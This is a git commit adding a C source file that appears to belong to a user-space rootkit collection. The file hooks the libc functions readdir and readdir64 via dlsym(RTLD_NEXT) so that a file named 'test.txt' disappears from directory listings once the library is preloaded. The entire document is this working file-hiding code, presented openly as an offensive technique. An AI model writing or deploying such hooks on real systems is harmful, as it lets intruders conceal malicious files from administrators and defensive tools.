6161d899be97c3f94d1da519a86f697811aca94b
bypasser0x2 <140964510+devilzsecurity@users.noreply.github.com>
2025-09-21 17:13:24 +0530

    Create hide.c

---
+++ linux/ring3/hide.c
@@ -0,0 +1,40 @@
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <string.h>
+// by devil0x1
+#define FILENAME "test.txt"
+
+static struct dirent *(*original_readdir)(DIR *) = NULL;
+static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
+
+struct dirent *readdir(DIR *dirp) {
+    if (!original_readdir) {
+        original_readdir = (struct dirent *(*)(DIR *))
+            dlsym(RTLD_NEXT, "readdir");
+    }
+
+    struct dirent *ep;
+    while ((ep = original_readdir(dirp)) != NULL) {
+        if (strcmp(ep->d_name, FILENAME) == 0) // it will skip the entry tho
+            continue;
+        return ep;
+    }
+    return NULL;
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    if (!original_readdir64) {
+        original_readdir64 = (struct dirent64 *(*)(DIR *))
+            dlsym(RTLD_NEXT, "readdir64");
+    }
+
+    struct dirent64 *ep;
+    while ((ep = original_readdir64(dirp)) != NULL) {
+        if (strcmp(ep->d_name, FILENAME) == 0)
+            continue;
+        return ep;
+    }
+    return NULL;
+}
